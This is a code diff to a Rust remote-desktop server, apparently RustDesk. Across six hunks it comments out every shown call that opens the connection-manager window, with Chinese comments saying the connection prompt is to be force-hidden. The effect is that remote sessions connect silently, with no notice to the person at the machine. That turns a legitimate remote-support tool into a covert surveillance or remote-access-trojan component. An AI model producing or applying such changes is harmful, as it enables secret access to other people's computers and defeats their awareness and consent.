@@ -2173,7 +2173,8 @@ impl Connection {
                     && is_logon()))
                 || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
             {
-                self.try_start_cm(lr.my_id, lr.my_name, false);
+                // 注释掉连接提示窗口，强制隐藏
+                // self.try_start_cm(lr.my_id, lr.my_name, false);
                 if hbb_common::get_version_number(&lr.version)
                     >= hbb_common::get_version_number("1.2.0")
                 {
@@ -2186,13 +2187,15 @@ impl Connection {
                     #[cfg(target_os = "linux")]
                     self.linux_headless_handle.wait_desktop_cm_ready().await;
                     self.send_logon_response().await;
-                    self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), self.authorized);
+                    // 强制隐藏连接提示窗口
+                    // self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), self.authorized);
                 } else {
                     self.send_login_error(err_msg).await;
                 }
             } else if lr.password.is_empty() {
                 if err_msg.is_empty() {
-                    self.try_start_cm(lr.my_id, lr.my_name, false);
+                    // 强制隐藏连接提示窗口
+                    // self.try_start_cm(lr.my_id, lr.my_name, false);
                 } else {
                     self.send_login_error(
                         crate::client::LOGIN_MSG_DESKTOP_SESSION_NOT_READY_PASSWORD_EMPTY,
@@ -2209,7 +2212,8 @@ impl Connection {
                     if err_msg.is_empty() {
                         self.send_login_error(crate::client::LOGIN_MSG_PASSWORD_WRONG)
                             .await;
-                        self.try_start_cm(lr.my_id, lr.my_name, false);
+                        // 强制隐藏连接提示窗口
+                        // self.try_start_cm(lr.my_id, lr.my_name, false);
                     } else {
                         self.send_login_error(
                             crate::client::LOGIN_MSG_DESKTOP_SESSION_NOT_READY_PASSWORD_WRONG,
@@ -2222,7 +2226,8 @@ impl Connection {
                         #[cfg(target_os = "linux")]
                         self.linux_headless_handle.wait_desktop_cm_ready().await;
                         self.send_logon_response().await;
-                        self.try_start_cm(lr.my_id, lr.my_name, self.authorized);
+                        // 强制隐藏连接提示窗口
+                        // self.try_start_cm(lr.my_id, lr.my_name, self.authorized);
                     } else {
                         self.send_login_error(err_msg).await;
                     }
@@ -2240,11 +2245,12 @@ impl Connection {
                         self.require_2fa.take();
                         raii::AuthedConnID::set_session_2fa(self.session_key());
                         self.send_logon_response().await;
-                        self.try_start_cm(
-                            self.lr.my_id.to_owned(),
-                            self.lr.my_name.to_owned(),
-                            self.authorized,
-                        );
+                        // 强制隐藏连接提示窗口
+                        // self.try_start_cm(
+                        //     self.lr.my_id.to_owned(),
+                        //     self.lr.my_name.to_owned(),
+                        //     self.authorized,
+                        // );
                         if !tfa.hwid.is_empty() && Self::enable_trusted_devices() {
                             Config::add_trusted_device(TrustedDevice {
                                 hwid: tfa.hwid,
@@ -2291,11 +2297,12 @@ impl Connection {
                         if uuid == uuid_old {
                             self.from_switch = true;
                             self.send_logon_response().await;
-                            self.try_start_cm(
-                                lr.my_id.clone(),
-                                lr.my_name.clone(),
-                                self.authorized,
-                            );
+                            // 强制隐藏连接提示窗口
+                            // self.try_start_cm(
+                            //     lr.my_id.clone(),
+                            //     lr.my_name.clone(),
+                            //     self.authorized,
+                            // );
                             #[cfg(not(any(target_os = "android", target_os = "ios")))]
                             self.try_start_cm_ipc();
                         }
